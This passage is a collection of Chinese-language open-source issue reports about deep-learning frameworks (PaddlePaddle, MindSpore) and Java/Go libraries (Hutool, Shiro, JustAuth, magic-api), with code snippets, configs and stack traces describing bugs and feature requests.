""path"": ""/exlog"", ""hidden"": false } ], ""dataScopes"": [ 142307070910539 ] }, ""extras"": null, ""timestamp"": 1624515109676 }"
【众智】【计算-AICPU开发】SegmentMin,"AICPU算子接入 算子交付规格-支持类型：除int8之外的全部实数类型。 沿张量的分段计算最小值。 input_x segment_ids output 对应底层算子 对应底层AI CPU算子SegmentMin： 待补充 TensorFlow接口：tf.math.segment_min https://www.tensorflow.org/api_docs/python/tf/math/segment_min 3. 异常处理 4. 算子反向 参考@ops.RegisterGradient(""SegmentMin"")   <code>: class SegmentMin (Primitive):"
"集成redis  ,ShiroConfig 配置匿名资源和不创建会话，访问还是一直进行shiro session 验证咋解决","能配置路径不去访问 RedisSessionDAO 中的方法么   <code>: filterChainDefinitionMap.put(""/xx/monitor"", ""noSessionCreation""); or filterChainDefinitionMap.put(""/xx/monitor"", ""anon"");"
如何让全连接层输出的结果都是正数呢？,"PaddlePaddle 1.2.0 Python 3.5 Windows 10 问题 使用的损失函数是，我想网络输出的是都是正数以上，不要输出负数，怎么处理呢？   <code>: square_error_cost fc1 = fliud.layers.fc(input=ipt, size=100, act='relu') fc1 = fliud.layers.fc(input=ipt, size=2)"
"使用CsvWriter的setAlwaysDelimitText方法,抛出StackOverflowError","使用的JDK版本和Hutool版本 JDK版本1.8 Hutool版本4.3.1 调用setAlwaysDelimitText方法报错 CsvWriter的setAlwaysDelimitText方法 错误信息   <code>: //指定路径和编码 CsvWriter writer = CsvUtil.getWriter(""c:/temp/testWrite.csv"", CharsetUtil.CHARSET_UTF_8); writer.setAlwaysDelimitText(true); //按行写出 writer.write( new String[]{""a1"", ""b1"", ""c1""}, new String[]{""a2"", ""b2"", ""c2""}, new String[]{""a3"", ""b3"", ""c3""} ); public void setAlwaysDelimitText(boolean alwaysDelimitText) { this.setAlwaysDelimitText(alwaysDelimitText);// 递归调用? } Exception in thread ""main"" java.lang.StackOverflowError at cn.hutool.core.text.csv.CsvWriter.setAlwaysDelimitText(CsvWriter.java:148) at cn.hutool.core.text.csv.CsvWriter.setAlwaysDelimitText(CsvWriter.java:148) at cn.hutool.core.text.csv.CsvWriter.setAlwaysDelimitText(CsvWriter.java:148) at cn.hutool.core.text.csv.CsvWriter.setAlwaysDelimitText(CsvWriter.java:148) ... ..."
Add support of const input while convert graph ir,"The graph ir convertor now don't support that an input is passed to op directly. The graph ir miss . Add support of const input while convert graph ir. Besides, the op doesn't support value inference.   <code>: Concat NetOutput Concat"
分布式训练ps直接crash,"version： os： gcc: ps log: worker: trainer对象代码 补充：编译v0.12.0版本，依然出现这个问题。我看了下代码，如果不使用etcd作为参数服务器，那么使用paddle自己编写的pserver作为参数服务器，则客户端是使用golang发了一个tcp的rpc请求，但是server和client的协议完全不一致，导致server按照MessageHeader格式去解析的时候，会开辟巨大一块内存，所以直接abort掉。这个问题难道paddle开发者没有在线下测试过？ 另外如果使用etcd作为参数服务器，客户端就直接hang住，具体栈信息后面再贴吧。   <code>: paddle version PaddlePaddle 0.11.0, compiled with with_avx: ON with_gpu: ON with_mkl: ON with_mkldnn: ON with_double: OFF with_python: ON with_rdma: OFF with_timer: OFF Ubuntu 16.04.4 LTS \n \l gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) pserver --port=7164 --ports_num=1 --ports_num_for_sparse=1 --num_gradient_servers=1 --nics=eth2 I0504 10:53:47.288414 10508 Util.cpp:166] commandline: /usr/local/bin/paddle_pserver_main --port=7164 --ports_num=1 --ports_num_for_sparse=1 --num_gradient_servers=1 --nics=eth2 I0504 10:53:55.056126 10508 ParameterServerController.cpp:83] number of parameterServer instances: 2 I0504 10:53:55.056174 10508 ParameterServerController.cpp:87] Starting parameterServer[0] I0504 10:53:55.056247 10508 ParameterServerController.cpp:87] Starting parameterServer[1] I0504 10:53:55.056284 10508 ParameterServerController.cpp:96] Waiting parameterServer[0] I0504 10:53:55.056350 10545 LightNetwork.cpp:273] tcp server start I0504 10:53:55.056579 10546 LightNetwork.cpp:273] tcp server start I0504 10:54:25.705910 11588 LightNetwork.cpp:326] worker started, peer = a.b.c.d terminate called after throwing an instance of 'std::bad_alloc' what(): std::bad_alloc *** Aborted at 1525402465 (unix time) try ""date -d @1525402465"" if you are using GNU date *** PC: @ 0x0 (unknown) *** SIGABRT (@0x3e80000290c) received by PID 10508 (TID 0x7fa1590be700) from PID 10508; stack trace: *** @ 0x7fa2330df390 (unknown) @ 0x7fa227f28428 gsignal @ 0x7fa227f2a02a abort @ 0x7fa22886b84d __gnu_cxx::__verbose_terminate_handler() @ 0x7fa2288696b6 (unknown) @ 0x7fa228869701 std::terminate() @ 0x7fa228894d38 (unknown) @ 0x7fa2330d56ba start_thread @ 0x7fa227ffa41d clone @ 0x0 (unknown) /usr/local/bin/paddle: line 179: 10508 Aborted ${DEBUGGER} $PADDLE_BIN_PATH/paddle_pserver_main ${@:2} trainer = paddle.trainer.SGD(cost, parameters, optimizer, is_local=False, pserver_spec=""a.b.c.d:7164"", use_etcd=False) I0504 10:54:00.445706 26487 Util.cpp:166] commandline: --ports_num_for_sparse=1 --use_gpu=False --trainer_id=1 --pservers=xxxxxxxx --trainer_count=10 --num_gradient_servers=1 --ports_num=1 --port=7164 I0504 10:54:04.720722 26487 GradientMachine.cpp:94] Initing parameters.. I0504 10:54:25.714896 26487 GradientMachine.cpp:101] Init parameters done. EROR[05-04|10:54:25] error connecting to pserver error=""dial-http tcp a.b.c.d:7164: read tcp a.b.c.d:53012-&gt;a.b.c.d:7164: read: connection reset by peer"" stack=""[github.com/PaddlePaddle/Paddle/go/pserver/client/client.go:95 github.com/PaddlePaddle/Paddle/go/pserver/client/client.go:108]"" EROR[05-04|10:54:35] error connecting to pserver error=""dial tcp a.b.c.d:7164: getsockopt: connection refused"" stack=""[github.com/PaddlePaddle/Paddle/go/pserver/client/client.go:95 github.com/PaddlePaddle/Paddle/go/pserver/client/client.go:110]"""
支持对gzip格式返回数据进行解压,"新增 @DecompressGzip 注解，以修饰请求可对返回的gzip或deflate格式数据进行解压。 可添加到方法上： 以及添加到接口类上：   <code>: @Get(""/test"") @DecompressGzip ForestResponse&lt;String&gt; transaction(String infno); /** * 添加@DecompressGzip注解的接口下所有方法自动会对返回数据进行GZip解压 */ @DecompressGzip public interface GzipClient2 { @Get(""/${0}"") ForestResponse&lt;String&gt; transaction(String infno); /** * 添加@DecompressGzip注解，并且参数为false，表示该方法的请求不进行解压 */ @Get(""/none-gzip"") @DecompressGzip(false) ForestResponse&lt;String&gt; noneGzip(); }"
layui表格动态设置滚动条的位置之后，对固定列无效,"图一是滚动条在最上面，左边的checkbox和颜色是固定列（fixed: 'left'）   <code>: tableIns.reload({ data: tableCache ,limit: tableCache.length ,done: function(res, curr, count){ layuitable[0].scrollTop = bfScrollTop; } });"
[CT][ms] Tensor slice error,"GPU -- MindSpore version : vm+graph -- Python version : -- OS platform and distribution : -- GCC/Compiler version : cd MindTester/trivial pytest -s test_trivial.py::test_trivial_call_function_twice_with_diff_key_value_para   <code>: def test_trivial_call_function_twice_with_diff_key_value_para(): class Net(nn.Cell, MetaFactory): def __init__(self): super(Net, self).__init__() MetaFactory.__init__(self) self.arange = nn.Range(0, 10) self.shape = P.Shape() self.concat = P.Concat() self.a = 1 self.b = 2 def compute(self, x, is_decoder): a = self.arange()[:x] if is_decoder: relative_attention_bias = a else: relative_attention_bias = a * 2 return relative_attention_bias def construct(self, x): x_shape = 7 result1 = self.compute(x_shape, is_decoder=self.a) result2 = self.compute(x_shape, is_decoder=self.b) return self.concat((result1, result2)) net = Net() input_x = Tensor(np.random.randn(3, 4).astype(np.float32)) out = net(input_x) exp_result = np.array([0, 1, 2, 3, 4, 5, 6, 0, 1, 2, 3, 4, 5, 6]) assert np.allclose(exp_result, out.asnumpy(), 0.0001, 0.0001) [INFO] CORE(12523,python):2021-01-29-23:54:01.832.561 [mindspore/core/ir/meta_func_graph.cc:78] GenerateFuncGraph] MetaFuncgraph: cache miss for types: [const vector][AbstractTuple(element[0]: AbstractTuple(element[0]: AbstractScalar(Type: Int64 Value: 0 Shape: NoShape),),element[1]: AbstractTuple(element[0]: AbstractScalar(Type: Int64 Value: 7 Shape: NoShape),),element[2]: AbstractTuple(element[0]: AbstractScalar(Type: Int64 Value: 1 Shape: NoShape),),), AbstractScalar(Type: Int64 Value: 2 Shape: NoShape)], g: _tuple_getitem_by_number [INFO] ANALYZER(12523,python):2021-01-29-23:54:01.839.062 [mindspore/ccsrc/pipeline/jit/static_analysis/static_analysis.cc:129] Run] construct_wrapper: Run finished. [ERROR] CORE(12523,python):2021-01-29-23:54:01.841.401 [mindspore/core/abstract/prim_structures.cc:112] InferImplMakeSlice] MakeSlice eval 1 parameter is an AbstractScalar, but is not an int64 number. [INFO] DEBUG(12523,python):2021-01-29-23:54:01.841.423 [mindspore/ccsrc/debug/trace.cc:112] TraceGraphEval] *******************************graph evaluate stack********************************** [INFO] DEBUG(12523,python):2021-01-29-23:54:01.841.560 [mindspore/ccsrc/debug/trace.cc:115] TraceGraphEval] #0 graph:compute with args[x:&lt;I64&gt;,is_decoder:&lt;Keyword[key : is_decodervalue : Int64]&gt;,]In file /home/wanghua/MindTester_me/trivial/test_trivial.py(280) def compute(self, x, is_decoder): #1 graph:?compute with args[]In file /home/wanghua/MindTester_me/trivial/test_trivial.py(282) if is_decoder: [INFO] DEBUG(12523,python):2021-01-29-23:54:01.841.579 [mindspore/ccsrc/debug/trace.cc:116] TraceGraphEval] ************************************************************************************* [INFO] DEBUG(12523,python):2021-01-29-23:54:01.841.589 [mindspore/ccsrc/debug/trace.cc:490] GetEvalStackInfo] Get graph analysis information begin [INFO] DEBUG(12523,python):2021-01-29-23:54:01.844.133 [mindspore/ccsrc/debug/trace.cc:522] GetEvalStackInfo] Get graph analysis information *end* F"
Evaluator cannot return the expected metrics.,"In V2 API, by default, the following codes print a certain metric calculated by an evaluator. In the C++ implementation, an evaluator stores the evaluation results in , and there are also some evaluators that store nothing but just print to stderr. The above code can only print the evaluated stored in Argument.value. If any of the following two situations happens, the evaluator cannot return a right result. An evaluator stores multiple evaluated metrics in a special format. An evaluator does not store the evaluated metrics but just print, for example, the chuck evaluator. For the fist case, there should be some documentations to explain how each evaluator stores its results. For the second case, the original C++ codes need to be modified. Does anyone test that in V2 API every evaluator returns the right results?   <code>: def event_handler(event): if isinstance(event, paddle.event.EndIteration): if event.batch_id % 100 == 0: print ""\nPass %d, Batch %d, Cost %f, %s"" % ( event.pass_id, event.batch_id, event.cost, event.metrics) Argument"
Oracle下因字段的大小写导致的注释失败,"OracleDBInfo.cs SetTableComment方法与SetColumnComment方法,作者把表名称与列名称都强制进行了大写的转换。但是在实际的项目中还是很大可能存在表名称与字段名称为小写。 如:User会被强制转换为USER。 在Master分支下,现在运行起来是有bug的,我上述的修改是基于 1.7.3版本。   <code>: public bool SetTableComment(string tableName, string comment){ ... //tableName = (tableName ?? string.Empty).ToUpper(); ... upsert_sql = @""comment on table "" +""\""""+ tableName + ""\"" is '"" + comment + ""'""; ... } public bool SetColumnComment(string tableName, string columnName, string comment){ ... //tableName = (tableName ?? string.Empty).ToUpper(); //columnName = (columnName ?? string.Empty).ToUpper(); string upsert_sql = string.Empty; //comment = (comment ?? string.Empty).Replace(""'"", """"); ... upsert_sql = @""comment on column "" +""\""""+ tableName + ""\"".\"""" + columnName + ""\"" is '"" + comment + ""'""; ... }"
glog 日志分级分文件记录,"能否有类似 ghttp 这样的功能. 把不同级别的日志写到不同的日志文件中 例如: glog.SetErrorLog(""error-{Ymd}.log"") 那么 glog.Errorln(), glog.Errorf(), 这个级别的日志都写入设定的日志文件中 其他 没有设置的都写入全局设置的日志文件中 glog.SetInfoLog(""info-{Ymd}.log"") 这样, 所有的Info级别的日志, 就写到 info-{Ymd}.log 日志文件中 同时设置两个级别, 那么这两个级别分别写入指定的日志文件, 其他级别写入到全局设定日志文件中 毕竟, 最关注的日志是错误日志 其他日志会有脚本定期删除   <code>: s.SetLogPath(""/tmp/gf.log"") s.SetAccessLogEnabled(true) s.SetErrorLogEnabled(true)"
Primitive GeLUGrad's bprop not defined.,"Primitive GeLUGrad's bprop not defined Ascend: -- MindSpore version (binary): 1.2.0 -- Python version : 3.7.6 -- OS platform and distribution : Linux notebook-3a57b562-efe3-4ff6-95ed-67fd5e37cc10 4.19.36-vhulk1907.1.0.h619.eulerosv2r8.aarch64 #1 SMP Mon Jul 22 00:00:00 UTC 2019 aarch64 aarch64 aarch64 GNU/Linux Implement the network Instantiate the model in GRAPH_MODE Run the TrainOneStepCellForD 在创建使用wgangp loss的gan网络时，网络中使用了GeLU，导致无法反向传播。经测试即使改用其他激活函数，AvgPool依然会导致无法反向传播。 顺利运行   <code>: @constexpr def generate_tensor(batch_size): np_array = np.random.randn(batch_size, 1, 1, 1) return Tensor(np_array, mindspore.float32) class GradientWithInput(nn.Cell): """"""Get Discriminator Gradient with Input"""""" def __init__(self, discriminator): super().__init__() self.reduce_sum = ops.ReduceSum() self.discriminator = discriminator self.discriminator.set_train(mode=True) self.discriminator.set_grad(True) def construct(self, interpolates): decision_interpolate, _ = self.discriminator(interpolates) decision_interpolate = self.reduce_sum(decision_interpolate, 0) return decision_interpolate class WGANGPGradientPenalty(nn.Cell): """"""Define WGAN loss for AttGAN"""""" def __init__(self, discriminator): super().__init__() self.gradient_op = ops.GradOperation() self.reduce_sum = ops.ReduceSum() self.reduce_sum_keep_dim = ops.ReduceSum(keep_dims=True) self.sqrt = ops.Sqrt() self.discriminator = discriminator self.GradientWithInput = GradientWithInput(discriminator) self.GradientWithInput.set_grad(True) def construct(self, x_real, x_fake): """"""get gradient penalty"""""" batch_size = x_real.shape[0] alpha = generate_tensor(batch_size) alpha = alpha.expand_as(x_real) x_fake = ops.functional.stop_gradient(x_fake) x_hat = x_real + alpha * (x_fake - x_real) gradient = self.gradient_op(self.GradientWithInput)(x_hat) gradient_1 = ops.reshape(gradient, (batch_size, -1)) gradient_1 = self.sqrt(self.reduce_sum(gradient_1 * gradient_1, 1)) gradient_penalty = self.reduce_sum((gradient_1 - 1.0) ** 2) / x_real.shape[0] return gradient_penalty class WithLossCellD(nn.Cell): def __init__(self, netD, netG, phi = 1.): super(WithLossCellD, self).__init__(auto_prefix=True) self.netD = netD self.netG = netG self.WGANLoss = WGANGPGradientPenalty(netD) self.phi = phi self.mean = ops.ReduceMean() def construct(self, real_data, latent_code): fake_data = self.netG(latent_code) fake_data = ops.stop_gradient(fake_data) real_validity = self.netD(real_data) fake_validity = self.netD(fake_data) gradient_penalty = self.WGANLoss(real_data, fake_data) d_loss3 = gradient_penalty * 10 / (self.phi ** 2) return d_loss3 context.set_context(mode=context.GRAPH_MODE, device_target=""Ascend"") # context.set_context(mode=context.PYNATIVE_MODE, device_target=""Ascend"") dconfig = DiscriminatorConfig(batch_size = 36, hidden_act = 'gelu') gconfig = GeneratorConfig(batch_size = 36, hidden_act = 'gelu') netD = Discriminator(dconfig) netG = Generator(gconfig) optimizerD = nn.Adam(netD.trainable_params(), learning_rate=lr, beta1=beta1) optimizerG = nn.Adam(netG.trainable_params(), learning_rate=lr, beta1=beta1) netD_with_criterion = WithLossCellD(netD, netG) netG_with_criterion = WithLossCellG(netD, netG) myTrainOneStepCellForD = nn.TrainOneStepCell(netD_with_criterion, optimizerD) myTrainOneStepCellForG = nn.TrainOneStepCell(netG_with_criterion, optimizerG) myTrainOneStepCellForD(real_data, latent_code)"
模型调用方法求助,"class Encoder(nn.Module): """""" Encoder. """""" 上面是用pytorch调用的模型，对模型进行更改，把最后两层去掉。老师，我现在想把这段代码用paddle框架实现，该如何写呢，我找不到方向。对于paddle的预训练模型，能不能访问每一层呢，请老师们帮忙解答一下。   <code>: def __init__(self, encoded_image_size=14): super(Encoder, self).__init__() self.enc_image_size = encoded_image_size resnet = torchvision.models.resnet101(pretrained=True) # pretrained ImageNet ResNet-101 # Remove linear and pool layers (since we're not doing classification) modules = list(resnet.children())[:-2] self.resnet = nn.Sequential(*modules) # Resize image to fixed size to allow input images of variable size self.adaptive_pool = nn.AdaptiveAvgPool2d((encoded_image_size, encoded_image_size))"
请问下 2.0.1启动失败,您好 加入配置 type: redis 后出现如下报错 APPLICATION FAILED TO START Description: Parameter 0 of method magicResourceService in org.ssssssss.magicapi.spring.boot.starter.MagicAPIAutoConfiguration required a bean of type 'org.ssssssss.magicapi.core.resource.Resource' that could not be found. Action: Consider defining a bean of type 'org.ssssssss.magicapi.core.resource.Resource' in your configuration. 请问大概是哪的问题呢 ps: 项目本身没有mysql之类的关系数据库依赖 所以排除了DataSourceAutoConfiguration 引入了mongo插件[magic-api-plugin-mongo v2.0.1] 关于magic-api的配置如下   <code>: magic-api: web: /magic/web show-url: false security: username: admin password: 123456 resource: type: redis # 存储方式改为redis prefix: magic-api # 前缀 readonly: false #是否为只读模式
Install npm pre-commit and pip yapf in Dockerfile,"Since we are making creating a development environment, we need to install pre-commit and yapf.   <code>: paddle/scripts/docker/Dockerfile{,gpu}"
钉钉登录回调报错,哪个平台？ 钉钉 点击钉钉登录，收到回调后调用以下代码报错：   <code>: AuthResponse&lt;AuthUser&gt; authResponse = authRequest.login(StrUtil.isEmpty(code) ? auth_code : code); org.springframework.web.util.NestedServletException: Handler dispatch failed; nested exception is java.lang.NoSuchMethodError: cn.hutool.json.JSONObject.&lt;init&gt;(Ljava/lang/CharSequence;)V at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1054) [spring-webmvc-5.1.7.RELEASE.jar!/:5.1.7.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:942) [spring-webmvc-5.1.7.RELEASE.jar!/:5.1.7.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1005) [spring-webmvc-5.1.7.RELEASE.jar!/:5.1.7.RELEASE] at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:897) [spring-webmvc-5.1.7.RELEASE.jar!/:5.1.7.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:634) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:882) [spring-webmvc-5.1.7.RELEASE.jar!/:5.1.7.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:741) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) [tomcat-embed-websocket-9.0.19.jar!/:9.0.19] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.springframework.boot.actuate.web.trace.servlet.HttpTraceFilter.doFilterInternal(HttpTraceFilter.java:90) [spring-boot-actuator-2.1.5.RELEASE.jar!/:2.1.5.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-5.1.7.RELEASE.jar!/:5.1.7.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.filterAndRecordMetrics(WebMvcMetricsFilter.java:117) [spring-boot-actuator-2.1.5.RELEASE.jar!/:2.1.5.RELEASE] at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:106) [spring-boot-actuator-2.1.5.RELEASE.jar!/:2.1.5.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-5.1.7.RELEASE.jar!/:5.1.7.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200) [spring-web-5.1.7.RELEASE.jar!/:5.1.7.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-5.1.7.RELEASE.jar!/:5.1.7.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:200) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:490) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.apache.catalina.core.StandardHostValve.invoke$original$qnerS5Fs(StandardHostValve.java:139) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.apache.catalina.core.StandardHostValve.invoke$original$qnerS5Fs$accessor$kzXsLEEj(StandardHostValve.java) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.apache.catalina.core.StandardHostValve$auxiliary$DY38OGhB.call(Unknown Source) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.apache.skywalking.apm.agent.core.plugin.interceptor.enhance.InstMethodsInter.intercept(InstMethodsInter.java:93) [skywalking-agent.jar:6.1.0] at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:408) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:836) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1747) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [?:1.8.0_144] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [?:1.8.0_144] at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.19.jar!/:9.0.19] at java.lang.Thread.run(Thread.java:748) [?:1.8.0_144] Caused by: java.lang.NoSuchMethodError: cn.hutool.json.JSONObject.&lt;init&gt;(Ljava/lang/CharSequence;)V at me.zhyd.oauth.request.AuthDingTalkRequest.getUserInfo(AuthDingTalkRequest.java:47) ~[JustAuth-1.5.1.jar!/:?] at me.zhyd.oauth.request.BaseAuthRequest.login(BaseAuthRequest.java:39) ~[JustAuth-1.5.1.jar!/:?]
swagger api 列表不见了,"master分支， 2022年1月10日代码的变动造成，API文档列表不见了 请求 http://localhost:9201/v2/api-docs 返回   <code>: {""swagger"":""2.0"",""info"":{""title"":""系统模块接口文档"",""contact"":{},""license"":{""name"":""Powered By ruoyi"",""url"":""https://ruoyi.vip""}},""host"":""localhost:9201"",""basePath"":""/"",""securityDefinitions"":{""Authorization"":{""type"":""apiKey"",""name"":""Authorization"",""in"":""header""}}}"
2.10.4 crud设置hide:true，v-model 绑定对应的prop值不更新,"2.10.4 版本column设置了hide:true，编辑弹窗表单，绑定的v-model值为空 列：   <code>: &lt;avue-crud ref=""crud"" v-model=""form"" /&gt; // 列表 column:[ { label:'A', prop:'a' }, { label:'B', prop:'b', hide: true }, ] // 编辑列表数据时 form 只有 a有值，b无值"
关于飞桨对异步计算的支持的请教,最近在写动手学深度学习的飞桨版本，我主要负责第八章，这章里的第二节是异步计算。 http://zh.gluon.ai/chapter_computational-performance/async-computation.html 里面有这样一段： 我想问一下，咱们飞桨有类似这样的设计概念吗？ 能否用1-2段话描述一下。 如果有装x的或者有助于理解学习的例子代码就更好了。 我自己在飞桨里了解到的异步方面，就是咱们的DataLoader异步加载这块，准备写上去一点。   <code>: MXNet中的异步计算 广义上讲，MXNet包括用户直接用来交互的前端和系统用来执行计算的后端。例如，用户可以使用不同的前端语言编写MXNet程序，如Python、R、Scala和C++。无论使用何种前端编程语言，MXNet程序的执行主要都发生在C++实现的后端。换句话说，用户写好的前端MXNet程序会传给后端执行计算。后端有自己的线程在队列中不断收集任务并执行它们。 MXNet通过前端线程和后端线程的交互实现异步计算。异步计算指，前端线程无须等待当前指令从后端线程返回结果就继续执行后面的指令。为了便于解释，假设Python前端线程调用以下4条指令。
使用redis集群。集群中禁掉了KEYS的使用。在操作菜单，角色等功能报错,"环境信息 pigx版本: 4.2.0 是否修改包名: 没修改 提供详细 naco配置 删除菜单，报错 2021-11-04 17:56:43.408 ERROR 24164 --- [ XNIO-1 task-6] c.d.y.c.s.h.GlobalBizExceptionHandler : 全局异常信息 ex=Error in execution; nested exception is io.lettuce.core.RedisCommandExecutionException: ERR unknown command , with args beginning with: , ; nested exception is org.springframework.data.redis.RedisSystemException: Error in execution; nested exception is io.lettuce.core.RedisCommandExecutionException: ERR unknown command , with args beginning with: , org.springframework.data.redis.connection.ClusterCommandExecutionFailureException: Error in execution; nested exception is io.lettuce.core.RedisCommandExecutionException: ERR unknown command , with args beginning with: , ; nested exception is org.springframework.data.redis.RedisSystemException: Error in execution; nested exception is io.lettuce.core.RedisCommandExecutionException: ERR unknown command , with args beginning with: , at org.springframework.data.redis.connection.ClusterCommandExecutor.collectResults(ClusterCommandExecutor.java:267) at org.springframework.data.redis.connection.ClusterCommandExecutor.executeCommandAsyncOnNodes(ClusterCommandExecutor.java:210) at org.springframework.data.redis.connection.ClusterCommandExecutor.executeCommandOnAllNodes(ClusterCommandExecutor.java:178) at org.springframework.data.redis.connection.lettuce.LettuceClusterKeyCommands.keys(LettuceClusterKeyCommands.java:91) at org.springframework.data.redis.connection.DefaultedRedisConnection.keys(DefaultedRedisConnection.java:111) at com.yqyc.common.data.cache.DefaultRedisCacheWriter.lambda$clean$4(DefaultRedisCacheWriter.java:171) at com.yqyc.common.data.cache.DefaultRedisCacheWriter.execute(DefaultRedisCacheWriter.java:240) at com.yqyc.common.data.cache.DefaultRedisCacheWriter.clean(DefaultRedisCacheWriter.java:160) at org.springframework.data.redis.cache.RedisCache.clear(RedisCache.java:193) at org.springframework.cache.interceptor.AbstractCacheInvoker.doClear(AbstractCacheInvoker.java:122) at org.springframework.cache.interceptor.CacheAspectSupport.performCacheEvict(CacheAspectSupport.java:505) at org.springframework.cache.interceptor.CacheAspectSupport.processCacheEvicts(CacheAspectSupport.java:493) at org.springframework.cache.interceptor.CacheAspectSupport.execute(CacheAspectSupport.java:434) at org.springframework.cache.interceptor.CacheAspectSupport.execute(CacheAspectSupport.java:345) at org.springframework.cache.interceptor.CacheInterceptor.invoke(CacheInterceptor.java:64) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:692) at com.yqyc.admin.service.impl.SysMenuServiceImpl$$EnhancerBySpringCGLIB$$7d422068.removeMenuById() at com.yqyc.admin.controller.SysMenuController.removeById(SysMenuController.java:135) at com.yqyc.admin.controller.SysMenuController$$FastClassBySpringCGLIB$$b7f87e60.invoke() at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:779) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:89) at com.yqyc.common.log.aspect.SysLogAspect.around(SysLogAspect.java:64) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at 